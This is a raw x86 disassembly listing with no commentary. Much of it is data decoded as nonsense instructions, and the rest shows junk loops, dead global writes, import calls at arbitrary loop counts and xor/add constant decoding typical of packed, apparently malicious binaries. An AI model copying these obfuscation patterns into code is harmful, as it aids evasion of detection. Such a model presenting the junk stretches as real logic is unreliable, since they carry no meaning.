  404c4a:	jnp    0x404c90
  404c4c:	or     DWORD PTR [edx+ebp*2+0x53ab0f50],edi
  404c53:	jo     0x404c3f
  404c55:	fst    DWORD PTR [edx-0x72]
  404c58:	adc    eax,0xe67a98a5
  404c5d:	loope  0x404c7c
  404c5f:	fucomi st,st(3)
  404c61:	shl    BYTE PTR [eax],1
  404c63:	movzx  ecx,si
  404c66:	sbb    eax,0xac81394a
  404c6b:	jns    0x404c09
  404c6d:	call   0x8248:0xb8a5c68
  404c74:	inc    edi
  404c75:	cmp    DWORD PTR [edi],ebp
  404c77:	push   esi
  404c78:	rol    dl,0x4f
  404c7b:	lods   eax,DWORD PTR ds:[esi]
  404c7c:	loopne 0x404c7d
  404c7e:	das    
  404c7f:	sub    dh,bh
  404c81:	push   ss
  404c82:	ja     0x404c93
  404c84:	test   BYTE PTR [eax],bh
  404c86:	and    ebp,ecx
  404c88:	add    al,0xd
  404c8a:	fldcw  WORD PTR [ecx+ecx*1-0x2f]
  404c8e:	hlt    
  404c8f:	in     al,dx
  404c90:	fistp  QWORD PTR [ebp-0x72b286fb]
  404c96:	mov    bl,0x67
  404c98:	fsubr  st(4),st
  404c9a:	pop    eax
  404c9b:	stos   BYTE PTR es:[edi],al
  404c9c:	ja     0x404ce3
  404c9e:	mov    ds,WORD PTR [ebx-0x20]
  404ca1:	test   BYTE PTR [ecx+ecx*1-0x13771f02],bl
  404ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ca9:	add    ebx,DWORD PTR [edx+0x4fe8f09d]
  404caf:	jnp    0x404c57
  404cb1:	stos   BYTE PTR es:[edi],al
  404cb2:	mov    dh,0xd7
  404cb4:	cmc    
  404cb5:	cmc    
  404cb6:	mov    ecx,0xdf9de72b
  404cbb:	popf   
  404cbc:	pop    esp
  404cbd:	xchg   esp,eax
  404cbe:	xor    ecx,DWORD PTR [ebx-0x48]
  404cc1:	xor    eax,0xe3c8d026
  404cc6:	leave  
  404cc7:	pushf  
  404cc8:	mov    bl,0x53
  404cca:	xchg   esp,eax
  404ccb:	test   eax,0x7044622
  404cd0:	jne    0x404d3a
  404cd2:	iret   
  404cd3:	ins    DWORD PTR es:[edi],dx
  404cd4:	ret    
  404cd5:	mov    ebp,0x67ff5bd1
  404cda:	iret   
  404cdb:	sbb    eax,0x4a4ec452
  404ce0:	ja     0x404cc9
  404ce2:	dec    esi
  404ce3:	mov    ecx,0x8fa35f58
  404ce8:	push   ebx
  404ce9:	mov    eax,ecx
  404ceb:	pop    ebp
  404cec:	ret    0x18
  404cef:	push   ebp
  404cf0:	mov    ebp,esp
  404cf2:	push   ecx
  404cf3:	add    DWORD PTR ds:0x4292b1,edx
  404cf9:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  404d00:	mov    eax,DWORD PTR [ebp-0x4]
  404d03:	and    ecx,ecx
  404d05:	mov    edx,DWORD PTR [ebp+0x10]
  404d08:	mov    DWORD PTR ds:0x4292d5,0x4d89
  404d12:	mov    ecx,0x7510857
  404d17:	xor    eax,ecx
  404d19:	add    eax,0x32729e
  404d1e:	jmp    0x404e84
  404d23:	jne    0x404d9b
  404d25:	xchg   DWORD PTR [ebx+ebx*4],ebx
  404d28:	mov    eax,ds:0x71892dbd
  404d2d:	arpl   WORD PTR [eax],ax
  404d2f:	adc    ebx,eax
  404d31:	mov    eax,0x7c151231
  404d36:	jl     0x404d6f
  404d38:	jg     0x404db6
  404d3a:	jl     0x404cd8
  404d3c:	and    dl,bl
  404d3e:	mov    bl,0x65
  404d40:	loop   0x404cde
  404d42:	push   edi
  404d43:	std    
  404d44:	out    dx,eax
  404d45:	push   esi
  404d46:	xor    edi,0x634e3aab
  404d4c:	cli    
  404d4d:	or     al,0x63
  404d4f:	out    0x34,al
  404d51:	xor    BYTE PTR [edx+0x8fa4f4e],bh
  404d57:	mov    WORD PTR [eax+0x4c],?
  404d5a:	mov    ecx,0xd96c03a8
  404d5f:	fiadd  DWORD PTR [edi+0x6145ad1b]
  404d65:	lock jo 0x404dd5
  404d68:	mov    bh,0xc7
  404d6a:	(bad)  
  404d6c:	mov    dh,0x79
  404d6e:	(bad)  
  404d6f:	mov    eax,0xfc53464a
  404d74:	mov    ah,0x15
  404d76:	call   DWORD PTR [eax+ecx*2]
  404d79:	repnz (bad) 
  404d7b:	fs (bad) 
  404d7e:	iret   
  404d7f:	xchg   esp,eax
  404d80:	mov    WORD PTR [eax+edx*2+0x78],cs
  404d84:	mov    WORD PTR [ecx],ds
  404d86:	cmp    al,0xf6
  404d88:	cmp    bh,BYTE PTR [edi+0x50d84c31]
  404d8e:	add    ebp,ebx
  404d90:	ret    
  404d91:	mov    dl,0x30
  404d93:	xchg   edx,eax
  404d94:	leave  
  404d95:	call   0x72d168d0
  404d9a:	test   DWORD PTR [esi+ebx*4+0x20c0016a],esp
  404da1:	imul   ecx,DWORD PTR [edi+edx*8+0x3],0xc43800b
  404da9:	aad    0x89
  404dab:	sub    BYTE PTR ds:0x4a2d3cc0,0xf7
  404db2:	mov    bh,0xb0
  404db4:	add    al,cl
  404db6:	inc    eax
  404db7:	in     eax,dx
  404db8:	add    DWORD PTR [eax+ebx*2],eax
  404dbb:	ret    
  404dbc:	xchg   esi,eax
  404dbd:	out    0x2e,al
  404dbf:	jns    0x404d70
  404dc1:	or     eax,0x163cc012
  404dc6:	ss mov bl,0x8a
  404dc9:	mov    ds:0xc1245b4b,al
  404dce:	and    al,0xfc
  404dd0:	fwait
  404dd1:	cmp    bh,cl
  404dd3:	je     0x404dc3
  404dd5:	mov    eax,ds:0xad9ef8bf
  404dda:	pusha  
  404ddb:	js     0x404e35
  404ddd:	test   eax,0xafcfe70e
  404de2:	jne    0x404e28
  404de4:	xchg   edx,eax
  404de5:	(bad)
  404de8:	mov    esp,0x6807285f
  404ded:	cli    
  404dee:	sbb    edi,DWORD PTR [ebp+0x6204e786]
  404df4:	(bad)  [eax+ebx*4+0x72]
  404df8:	mov    esi,0xbbdfaf78
  404dfd:	jmp    0xa3ed:0x6c9d5bc1
  404e04:	(bad)  
  404e05:	or     al,0xcb
  404e07:	jecxz  0x404e70
  404e09:	ret    
  404e0a:	sahf   
  404e0b:	xor    al,0xbb
  404e0d:	dec    edi
  404e0e:	fdiv   QWORD PTR [ecx+0x18cb9df5]
  404e14:	xor    eax,0x7eda56be
  404e19:	fcmovb st,st(3)
  404e1b:	out    0x5f,al
  404e1d:	jl     0x404e1e
  404e1f:	add    DWORD PTR [ebx],eax
  404e21:	sbb    BYTE PTR [edi-0x217145fe],al
  404e27:	push   esp
  404e28:	push   es
  404e29:	jb     0x404e96
  404e2b:	pop    esp
  404e2c:	mov    esp,0xbaa4735e
  404e31:	stos   DWORD PTR es:[edi],eax
  404e32:	test   al,0x9f
  404e34:	push   ebp
  404e35:	xchg   edi,eax
  404e36:	mov    ah,0x7c
  404e38:	pop    ebx
  404e39:	shr    DWORD PTR [edx-0x48],cl
  404e3c:	push   0xffffffe1
  404e3e:	pushf  
  404e3f:	xchg   ebx,eax
  404e40:	stos   DWORD PTR es:[edi],eax
  404e41:	xor    esp,DWORD PTR [edi-0x79]
  404e44:	mov    ebp,0x14920a49
  404e49:	mov    al,ds:0x8b8a0d52
  404e4e:	mov    ecx,0xd78766ce
  404e53:	dec    edi
  404e54:	shl    DWORD PTR [edi-0x75],1
  404e57:	jo     0x404e14
  404e59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e5a:	outs   dx,BYTE PTR ds:[esi]
  404e5b:	adc    al,0xa0
  404e5d:	call   0x4a6e:0xe5e834a1
  404e64:	mov    ah,dh
  404e66:	sub    ebx,DWORD PTR [eax]
  404e68:	mov    ds:0x21813ad6,al
  404e6d:	scas   al,BYTE PTR es:[edi]
  404e6e:	pop    esp
  404e6f:	sbb    BYTE PTR [edx-0x74],ah
  404e72:	jp     0x404ed7
  404e74:	pushf  
  404e75:	add    DWORD PTR [edi],ecx
  404e77:	mov    cl,0x31
  404e79:	add    BYTE PTR [eax+0x634bdea1],dl
  404e7f:	or     DWORD PTR [eax],ecx
  404e81:	mov    ebx,0x289582a
  404e86:	or     DWORD PTR ds:0x4292a9,ebx
  404e8c:	mov    eax,DWORD PTR [ebp+0x14]
  404e8f:	not    edx
  404e91:	mov    edx,DWORD PTR [ebp+0x10]
  404e94:	mov    DWORD PTR [edx+0x4],eax
  404e97:	mov    eax,DWORD PTR [ebp+0x18]
  404e9a:	sbb    DWORD PTR ds:0x42c88e,0xab4
  404ea4:	mov    edx,DWORD PTR [ebp+0x10]
  404ea7:	mov    DWORD PTR [edx+0x8],eax
  404eaa:	sub    edx,eax
  404eac:	mov    eax,DWORD PTR [ebp+0x1c]
  404eaf:	mov    edx,DWORD PTR ds:0x4275b0
  404eb5:	and    DWORD PTR ds:0x427594,edx
  404ebb:	jmp    0x405021
  404ec0:	fdiv   DWORD PTR [ebx+0x2e]
  404ec3:	dec    esp
  404ec4:	stc    
  404ec5:	gs jp  0x404e53
  404ec8:	jg     0x404e7d
  404eca:	pushf  
  404ecb:	mov    ecx,0x572fe0b8
  404ed0:	in     eax,dx
  404ed1:	adc    al,0x7c
  404ed3:	jl     0x404f0c
  404ed5:	jg     0x404f53
  404ed7:	jl     0x404ed7
  404ed9:	xchg   BYTE PTR [eax-0x71],bl
  404edc:	sub    eax,0xcfb67763
  404ee1:	fadd   DWORD PTR [bx+si+0x58]
  404ee5:	inc    esp
  404ee6:	push   esp
  404ee7:	into   
  404ee8:	mov    cl,0x61
  404eea:	iret   
  404eeb:	call   0x9765:0x5143fe9a
  404ef2:	dec    BYTE PTR [ecx]
  404ef4:	aas    
  404ef5:	and    esp,DWORD PTR [esi+0x6fff342f]
  404efb:	jmp    0xef36c569
  404f00:	lahf   
  404f01:	push   edi
  404f02:	int3   
  404f03:	test   DWORD PTR [bx+di],edx
  404f06:	xchg   esi,eax
  404f07:	jne    0x404f4d
  404f09:	sub    dh,dl
  404f0b:	repnz (bad) 
  404f0e:	sub    esp,DWORD PTR [ebp+ebp*4+0x40fba076]
  404f15:	mov    al,ds:0xbddcfa8c
  404f1a:	dec    ebp
  404f1b:	mov    si,0xbcad
  404f1f:	push   0xecd34e1a
  404f24:	push   cs
  404f25:	inc    esp
  404f26:	add    BYTE PTR [esi],bh
  404f28:	pop    ds
  404f29:	push   ebx
  404f2a:	mov    esi,0xbcf9fc8e
  404f2f:	out    0x94,al
  404f31:	scas   al,BYTE PTR es:[edi]
  404f32:	icebp  
  404f33:	aam    0xcb
  404f35:	lahf   
  404f36:	adc    ah,bl
  404f38:	imul   edx,DWORD PTR [edx],0xc78893fd
  404f3e:	js     0x404f6e
  404f40:	cs in  al,0x23
  404f43:	repz icebp 
  404f45:	inc    edi
  404f46:	(bad)  
  404f47:	fild   WORD PTR [eax+0x34630c79]
  404f4d:	mov    eax,0x38b055fd
  404f52:	mov    ecx,0x666af82e
  404f57:	adc    ebp,0x23
  404f5a:	aas    
  404f5b:	cmp    ah,0xc5
  404f5e:	or     DWORD PTR [eax-0x38bcf779],esp
  404f64:	xor    edx,eax
  404f66:	lock loope 0x404f5a
  404f69:	mov    ch,0x7f
  404f6b:	pushf  
  404f6c:	rcr    BYTE PTR [esi*1-0x4fa5cb41],cl
  404f73:	push   ds
  404f74:	mov    WORD PTR [esi-0x44],fs
  404f77:	fsubr  QWORD PTR [esi+0x71]
  404f7a:	fs mov ch,0xcd
  404f7d:	push   cs
  404f7e:	mov    bh,0x59
  404f80:	adc    dl,ah
  404f82:	xor    eax,0xbc84ccfc
  404f87:	and    BYTE PTR [edx-0x48],dh
  404f8a:	fstp   TBYTE PTR [eax-0xe]
  404f8d:	mov    ss,ecx
  404f8f:	dec    ecx
  404f90:	nop    DWORD PTR [edi]
  404f93:	add    cl,BYTE PTR [ecx+0x66e31f16]
  404f99:	pop    edi
  404f9a:	jp     0x404f2d
  404f9c:	fcom   QWORD PTR [edx]
  404f9e:	push   esp
  404f9f:	inc    esi
  404fa0:	dec    edi
  404fa1:	inc    esp
  404fa2:	lods   eax,DWORD PTR ds:[esi]
  404fa3:	stos   BYTE PTR es:[edi],al
  404fa4:	fcom   DWORD PTR [esi+0x5f499ec3]
  404faa:	je     0x404feb
  404fac:	mov    ecx,0xc92b2eb0
  404fb1:	ret    0x507e
  404fb4:	int3   
  404fb5:	mov    ah,0x5c
  404fb7:	pop    ebx
  404fb8:	inc    edx
  404fb9:	add    dh,BYTE PTR [edi]
  404fbb:	push   ss
  404fbc:	lahf   
  404fbd:	fild   DWORD PTR [ecx-0x38f6ba2d]
  404fc3:	jb     0x40500c
  404fc5:	in     eax,dx
  404fc6:	ins    DWORD PTR es:[edi],dx
  404fc7:	inc    esp
  404fc8:	ret    
  404fc9:	aaa    
  404fca:	cs aam 0x14
  404fcd:	mov    esi,DWORD PTR [ebp-0x12de0fbe]
  404fd3:	lods   al,BYTE PTR fs:[esi]
  404fd5:	pusha  
  404fd6:	push   ebp
  404fd7:	jbe    0x404f6d
  404fd9:	jg     0x40500b
  404fdb:	mov    ebx,0xa177e13f
  404fe0:	fdivp  st(0),st
  404fe2:	aas    
  404fe3:	test   esp,0xd1e56bec
  404fe9:	xchg   edx,eax
  404fea:	mov    BYTE PTR [ebx],al
  404fec:	into   
  404fed:	xchg   ebx,eax
  404fee:	xchg   DWORD PTR [ebp+0x5f334704],ebp
  404ff4:	dec    esi
  404ff5:	(bad)  
  404ff6:	pop    eax
  404ff7:	mov    ebp,esi
  404ff9:	inc    edx
  404ffa:	push   ebp
  404ffb:	dec    eax
  404ffc:	call   DWORD PTR ds:0x24b82f3b
  405002:	jecxz  0x404fef
  405004:	sbb    DWORD PTR [esi+0x7],esp
  405007:	mov    ecx,0x2a924d48
  40500c:	ror    edi,0x75
  40500f:	out    dx,eax
  405010:	or     al,0x3d
  405012:	test   DWORD PTR [edx-0x6e379138],esi
  405018:	outs   dx,BYTE PTR ds:[esi]
  405019:	jge    0x405055
  40501b:	jne    0x404ff5
  40501d:	out    dx,al
  40501e:	and    dh,BYTE PTR [edi-0xf]
  405021:	mov    edx,DWORD PTR [ebp+0x10]
  405024:	mov    DWORD PTR [edx+0xc],eax
  405027:	adc    DWORD PTR ds:0x427d0f,ebx
  40502d:	mov    eax,DWORD PTR [ebp+0x20]
  405030:	sbb    DWORD PTR ds:0x427598,0x4ffb
  40503a:	jmp    0x4051a0
  40503f:	jno    0x40503e
  405041:	xlat   BYTE PTR ds:[ebx]
  405042:	sti    
  405043:	sti    
  405044:	std    
  405045:	add    eax,0xd7a6c1fd
  40504a:	mov    dl,0x79
  40504c:	push   0x17a4ea24
  405051:	jl     0x4050cf
  405053:	aaa    
  405054:	jg     0x4050d2
  405056:	jl     0x404fe2
  405058:	ret    
  405059:	sbb    al,0xdb
  40505c:	xor    edi,0x5c
  40505f:	or     al,0x15
  405061:	repnz aam 0xa2
  405064:	and    al,0x6a
  405066:	xchg   ebx,eax
  405067:	lea    edi,[edx+0x584cf05d]
  40506d:	mov    ds:0xacc88810,al
  405072:	mov    ds:0x3b76d9b8,eax
  405077:	(bad)  [eax]
  405079:	xlat   BYTE PTR ds:[ebx]
  40507a:	bound  ebp,QWORD PTR [ebx+eax*1-0x5d]
  40507e:	idiv   DWORD PTR [ebp+0x534195ad]
  405084:	pop    esi
  405085:	xchg   ebp,eax
  405086:	xchg   ecx,eax
  405087:	and    al,BYTE PTR [edi]
  405089:	test   al,0x84
  40508b:	jo     0x405035
  40508d:	mov    al,0x4d
  40508f:	enter  0x41e,0x4a
  405093:	ja     0x405094
  405095:	lock and eax,0xe6ada661
  40509b:	sysret 
  40509d:	es (bad) 
  4050a0:	mov    bl,0x97
  4050a2:	and    ah,BYTE PTR [esi-0xceacfd]
  4050a8:	cwde   
  4050a9:	iret   
  4050aa:	xor    DWORD PTR ds:0x3e818d8,0xffffffe9
  4050b1:	cmp    ecx,DWORD PTR [esi+esi*4+0x65]
  4050b5:	cli    
  4050b6:	push   0x48b41cb5
  4050bb:	push   edx
  4050bc:	push   ebp
  4050bd:	xchg   edx,eax
  4050be:	cdq    
  4050bf:	dec    ecx
  4050c0:	mov    esi,0x3370b726
  4050c5:	(bad)  
  4050c6:	call   0x215c3ca9
  4050cb:	(bad)  
  4050cc:	pop    edi
  4050cd:	sub    eax,0x4485eda9
  4050d2:	xchg   esp,eax
  4050d3:	sub    eax,DWORD PTR [ebx-0x26]
  4050d6:	lock call 0x2bcc:0x20f538ca
  4050de:	inc    ebp
  4050df:	cdq    
  4050e0:	cmp    eax,0xba33ebfb
  4050e5:	call   0xabd5:0xb22cc3de
  4050ec:	stos   DWORD PTR es:[edi],eax
  4050ed:	call   0x2142:0x4f68b707
  4050f4:	mov    bh,0x31
  4050f6:	mov    gs,WORD PTR [edi+ecx*2-0x9dd9952]
  4050fd:	and    DWORD PTR [ebp+0x6641bfc6],eax
  405103:	mov    al,ds:0x1047d57a
  405108:	mov    ah,0x5b
  40510a:	cld    
  40510b:	adc    BYTE PTR [eax-0x46dae27],bh
  405111:	outs   dx,DWORD PTR ds:[esi]
  405112:	xor    BYTE PTR [edi-0x4c],cl
  405115:	stos   BYTE PTR es:[edi],al
  405116:	int    0x8d
  405118:	pop    ss
  405119:	data16 (bad) 
  40511c:	mov    esp,0x3f9de4e8
  405121:	xchg   edi,eax
  405122:	in     eax,dx
  405123:	mov    eax,ds:0xdd52b5af
  405128:	push   ebp
  405129:	mov    ch,0x5c
  40512b:	ins    DWORD PTR es:[edi],dx
  40512c:	jmp    DWORD PTR [ebx-0x5885002e]
  405132:	xor    DWORD PTR [esi-0x32df03d3],edx
  405138:	push   eax
  405139:	push   esp
  40513a:	call   0xa85a4079
  40513f:	enter  0x6054,0x2a
  405143:	retf   0x8222
  405146:	test   DWORD PTR [edi],0x93cca0bd
  40514c:	ret    
  40514d:	adc    BYTE PTR [ecx-0x27],dh
  405150:	mov    eax,ds:0xb4cc5da3
  405155:	pushf  
  405156:	(bad)  
  405157:	in     al,dx
  405158:	sbb    DWORD PTR [ebp-0x28ed9b6d],ecx
  40515e:	mov    al,0x65
  405160:	fidiv  WORD PTR [edx+0x4f]
  405163:	fwait
  405164:	shr    DWORD PTR [ebx+eiz*8-0x12860d3d],0x3c
  40516c:	cwde   
  40516d:	mov    cl,cl
  40516f:	nop
  405170:	fwait
  405171:	scas   al,BYTE PTR es:[edi]
  405172:	sbb    DWORD PTR [esi-0x73],eax
  405175:	(bad)  
  405176:	shl    DWORD PTR [ebx-0x7858d73d],1
  40517c:	imul   edi,DWORD PTR [eax+0x54],0xffffffd4
  405180:	mov    esi,0x663fce9a
  405185:	adc    dh,bl
  405187:	shl    BYTE PTR [esi+0x69427130],cl
  40518d:	xor    bl,dh
  40518f:	pop    esp
  405190:	add    ch,BYTE PTR [ebp+0x7b]
  405193:	cmp    eax,0x5d3843b9
  405198:	popf   
  405199:	sub    DWORD PTR [edi-0x5ea2a09b],ebp
  40519f:	pop    esi
  4051a0:	mov    edx,DWORD PTR [ebp+0x10]
  4051a3:	mov    DWORD PTR [edx+0x10],eax
  4051a6:	mov    eax,eax
  4051a8:	mov    eax,DWORD PTR [ebp+0x14]
  4051ab:	test   eax,eax
  4051ad:	mov    eax,DWORD PTR [ebp+0x8]
  4051b0:	jne    0x4051b9
  4051b6:	mov    eax,DWORD PTR [ebp+0xc]
  4051b9:	xor    eax,ecx
  4051bb:	add    eax,0x32729e
  4051c0:	leave  
  4051c1:	ret    0x1c
  4051c4:	push   ebp
  4051c5:	mov    ebp,esp
  4051c7:	sub    esp,0x10c
  4051cd:	adc    DWORD PTR ds:0x427cff,0x42c892
  4051d7:	push   ebx
  4051d8:	push   esi
  4051d9:	push   edi
  4051da:	push   0x409348
  4051df:	adc    DWORD PTR ds:0x4275a0,0x3f8f
  4051e9:	call   DWORD PTR ds:0x427cab
  4051ef:	test   eax,eax
  4051f1:	mov    DWORD PTR ds:0x427594,0x1688
  4051fb:	je     0x405208
  405201:	xor    eax,eax
  405203:	jmp    0x4063e6
  405208:	and    DWORD PTR ds:0x4292a5,0x4292c9
  405212:	push   0x4092b4
  405217:	adc    DWORD PTR ds:0x4292cd,0x1b3a
  405221:	call   DWORD PTR ds:0x427a33
  405227:	and    DWORD PTR ds:0x427d07,0x4292c5
  405231:	test   ax,ax
  405234:	mov    DWORD PTR ds:0x42c882,0x6514
  40523e:	je     0x40526d
  405244:	push   0x3546
  405249:	push   0x65890909
  40524e:	or     DWORD PTR ds:0x42c882,0x42c89a
  405258:	call   DWORD PTR ds:0x4279ef
  40525e:	mov    DWORD PTR ds:0x4292dd,0x79a2
  405268:	jmp    0x4063e6
  40526d:	mov    ecx,0xf89c8535
  405272:	mov    DWORD PTR [ebp-0x20],ecx
  405275:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  40527c:	sub    ebx,edx
  40527e:	lea    eax,[ebp-0x58]
  405281:	neg    esi
  405283:	mov    DWORD PTR [ebp-0x60],eax
  405286:	and    DWORD PTR ds:0x4292c1,0x0
  405290:	mov    edx,DWORD PTR ds:0x4292c1
  405296:	inc    edx
  405297:	mov    DWORD PTR ds:0x4292c1,edx
  40529d:	cmp    DWORD PTR ds:0x4292c1,0x1e
  4052a4:	jne    0x4052bd
  4052aa:	push   0x63b5
  4052af:	push   DWORD PTR [ebp-0x28]
  4052b2:	push   0x5536
  4052b7:	call   DWORD PTR ds:0x427a97
  4052bd:	cmp    DWORD PTR ds:0x4292c1,0x10
  4052c4:	jb     0x405290
  4052ca:	movzx  ebx,WORD PTR ds:0x42c88a
  4052d1:	adc    DWORD PTR ds:0x4292c1,ebx
  4052d7:	lea    eax,[ebp-0x50]
  4052da:	sbb    ebx,DWORD PTR ds:0x4275b0
  4052e0:	mov    DWORD PTR [ebp-0x10],eax
  4052e3:	mov    eax,ds:0x4091a0
  4052e8:	sbb    ebx,esi
  4052ea:	mov    eax,DWORD PTR [eax+0x1c8]
  4052f0:	and    DWORD PTR ds:0x4275a4,0x0
  4052fa:	mov    esi,DWORD PTR ds:0x4275a4
  405300:	inc    esi
  405301:	mov    DWORD PTR ds:0x4275a4,esi
  405307:	cmp    DWORD PTR ds:0x4275a4,0x4
  40530e:	jne    0x40531f
  405314:	push   0x1257
  405319:	call   DWORD PTR ds:0x4279d7
  40531f:	cmp    DWORD PTR ds:0x4275a4,0x3
  405326:	jne    0x405339
  40532c:	mov    esi,DWORD PTR ds:0x4275a4
  405332:	inc    esi
  405333:	mov    DWORD PTR ds:0x4275a4,esi
  405339:	cmp    DWORD PTR ds:0x4275a4,0x1a
  405340:	jb     0x4052fa
  405346:	sbb    esi,DWORD PTR ds:0x4292dd
  40534c:	mov    eax,DWORD PTR [eax]
  40534e:	mov    edx,DWORD PTR [ebp-0x10]
  405351:	sbb    ebx,0x4bc4
  405357:	mov    esi,0x7510857
  40535c:	xor    eax,esi
  40535e:	and    DWORD PTR ds:0x4292c5,0x0
  405368:	jmp    0x40537c
  40536d:	xor    ebx,ebx
  40536f:	add    ebx,DWORD PTR ds:0x4292c5
  405375:	inc    ebx
  405376:	mov    DWORD PTR ds:0x4292c5,ebx
  40537c:	cmp    DWORD PTR ds:0x4292c5,0x10
  405383:	jae    0x4053d4
  405389:	cmp    DWORD PTR ds:0x4292c5,0xb
  405390:	jne    0x4053af
  405396:	push   0x1343
  40539b:	push   DWORD PTR [ebp-0xc]
  40539e:	push   DWORD PTR [ebp-0x14]
  4053a1:	push   0x4e35
  4053a6:	push   DWORD PTR [ebp-0x28]
  4053a9:	call   DWORD PTR ds:0x4278f7
  4053af:	cmp    DWORD PTR ds:0x4292c5,0xa
  4053b6:	jne    0x4053c9
  4053bc:	mov    ebx,DWORD PTR ds:0x4292c5
  4053c2:	inc    ebx
  4053c3:	mov    DWORD PTR ds:0x4292c5,ebx
  4053c9:	jmp    0x40536d
  4053ce:	adc    ebx,DWORD PTR ds:0x427598
  4053d4:	mov    ebx,0x32729e
  4053d9:	sbb    DWORD PTR ds:0x42c89e,0x427d13
  4053e3:	add    eax,ebx
  4053e5:	mov    DWORD PTR ds:0x4292b9,0x4aac
  4053ef:	mov    DWORD PTR [edx],eax
  4053f1:	mov    eax,ds:0x409464
  4053f6:	mov    DWORD PTR ds:0x42c882,0x6078
  405400:	cmp    eax,0x23d14057
  405405:	mov    eax,DWORD PTR [ebp-0x18]
  405408:	mov    DWORD PTR ds:0x4292dd,0x3967
  405412:	je     0x405434
  405418:	mov    ecx,DWORD PTR [ebp-0x20]
  40541b:	xor    eax,esi
  40541d:	add    eax,ebx
  40541f:	imul   eax,ecx
  405422:	mov    DWORD PTR ds:0x4292c5,0x1be9
  40542c:	mov    DWORD PTR [ebp-0x20],eax
  40542f:	jmp    0x405ffd
  405434:	xor    eax,esi
  405436:	add    eax,ebx
  405438:	mov    DWORD PTR ds:0x42c886,0x19
  405442:	cmp    DWORD PTR ds:0x42c886,0x0
  405449:	je     0x405480
  40544f:	cmp    DWORD PTR ds:0x42c886,0x23
  405456:	jne    0x405468
  40545c:	push   DWORD PTR [ebp-0x20]
  40545f:	push   DWORD PTR [ebp-0x24]
  405462:	call   DWORD PTR ds:0x427a9b
  405468:	mov    edx,DWORD PTR ds:0x42c886
  40546e:	dec    edx
  40546f:	mov    DWORD PTR ds:0x42c886,edx
  405475:	jmp    0x405442
  40547a:	or     edx,0x41a6
  405480:	mov    ds:0x4092b0,eax
  405485:	mov    eax,DWORD PTR [ebp-0x20]
  405488:	add    edx,DWORD PTR ds:0x42c89a
  40548e:	xor    eax,esi
  405490:	and    edx,0x2762
  405496:	add    eax,ebx
  405498:	and    DWORD PTR ds:0x42c88e,0x0
  4054a2:	jmp    0x4054b4
  4054a7:	mov    edx,DWORD PTR ds:0x42c88e
  4054ad:	inc    edx
  4054ae:	mov    DWORD PTR ds:0x42c88e,edx
  4054b4:	cmp    DWORD PTR ds:0x42c88e,0x1d
  4054bb:	jae    0x405501
  4054c1:	cmp    DWORD PTR ds:0x42c88e,0xd
  4054c8:	jne    0x4054dc
  4054ce:	push   DWORD PTR [ebp-0x18]
  4054d1:	push   0x590a
  4054d6:	call   DWORD PTR ds:0x427a9f
  4054dc:	cmp    DWORD PTR ds:0x42c88e,0xc
  4054e3:	jne    0x4054f6
  4054e9:	mov    edx,DWORD PTR ds:0x42c88e
  4054ef:	inc    edx
  4054f0:	mov    DWORD PTR ds:0x42c88e,edx
  4054f6:	jmp    0x4054a7
  4054fb:	add    DWORD PTR ds:0x427d13,edi
  405501:	mov    ds:0x409464,eax
  405506:	and    DWORD PTR ds:0x4292b9,0x0
  405510:	jmp    0x405522
  405515:	mov    edx,DWORD PTR ds:0x4292b9
  40551b:	inc    edx
  40551c:	mov    DWORD PTR ds:0x4292b9,edx
  405522:	cmp    DWORD PTR ds:0x4292b9,0x19
  405529:	jae    0x4055c8
  40552f:	cmp    DWORD PTR ds:0x4292b9,0x8
  405536:	jne    0x40554a
  40553c:	push   0x4277cc
  405541:	push   DWORD PTR [ebp-0x28]
  405544:	call   DWORD PTR ds:0x427aa3
  40554a:	cmp    DWORD PTR ds:0x4292b9,0x7
  405551:	jne    0x405566
  405557:	xor    edx,edx
  405559:	xor    edx,DWORD PTR ds:0x4292b9
  40555f:	inc    edx
  405560:	mov    DWORD PTR ds:0x4292b9,edx
  405566:	jmp    0x405515
  40556b:	mov    DWORD PTR ds:0x42759c,0x10
  405575:	cmp    DWORD PTR ds:0x42759c,0x0
  40557c:	je     0x4055c8
  405582:	cmp    DWORD PTR ds:0x42759c,0x1f
  405589:	jne    0x4055b2
  40558f:	push   0x76d3
  405594:	push   DWORD PTR [ebp-0x10]
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x14]
  40559d:	push   0x4ba5
  4055a2:	push   0x42782a
  4055a7:	push   0x400000
  4055ac:	call   DWORD PTR ds:0x4278fb
  4055b2:	mov    eax,ds:0x42759c
  4055b7:	dec    eax
  4055b8:	mov    ds:0x42759c,eax
  4055bd:	jmp    0x405575
  4055c2:	xor    DWORD PTR ds:0x427d0b,edx
  4055c8:	mov    eax,DWORD PTR [ebp-0x18]
  4055cb:	mov    edx,DWORD PTR ds:0x4092b0
  4055d1:	mov    DWORD PTR ds:0x4275a8,0x6b2
  4055db:	xor    eax,esi
  4055dd:	add    eax,ebx
  4055df:	mov    DWORD PTR ds:0x4292d1,0x50ae
  4055e9:	cmp    edx,eax
  4055eb:	mov    DWORD PTR ds:0x4292d1,0x1218
  4055f5:	jne    0x405ffd
  4055fb:	and    DWORD PTR ds:0x427d17,0x0
  405605:	mov    eax,ds:0x427d17
  40560a:	inc    eax
  40560b:	mov    ds:0x427d17,eax
  405610:	cmp    DWORD PTR ds:0x427d17,0x7
  405617:	jne    0x40562d
  40561d:	push   0x4275e0
  405622:	push   0x400000
  405627:	call   DWORD PTR ds:0x427aa7
  40562d:	cmp    DWORD PTR ds:0x427d17,0x6
  405634:	jne    0x405645
  40563a:	mov    eax,ds:0x427d17
  40563f:	inc    eax
  405640:	mov    ds:0x427d17,eax
  405645:	cmp    DWORD PTR ds:0x427d17,0x15
  40564c:	jb     0x405605
  405652:	mov    eax,DWORD PTR [ebp-0x18]
  405655:	mov    DWORD PTR [ebp-0x30],eax
  405658:	and    DWORD PTR ds:0x4275ac,0x0
  405662:	jmp    0x405672
  405667:	mov    eax,ds:0x4275ac
  40566c:	inc    eax
  40566d:	mov    ds:0x4275ac,eax
  405672:	cmp    DWORD PTR ds:0x4275ac,0x12
  405679:	jae    0x40570b
  40567f:	cmp    DWORD PTR ds:0x4275ac,0x5
  405686:	jne    0x40569c
  40568c:	push   0x8a4f
  405691:	push   0x1ced
  405696:	call   DWORD PTR ds:0x427aab
  40569c:	cmp    DWORD PTR ds:0x4275ac,0x4
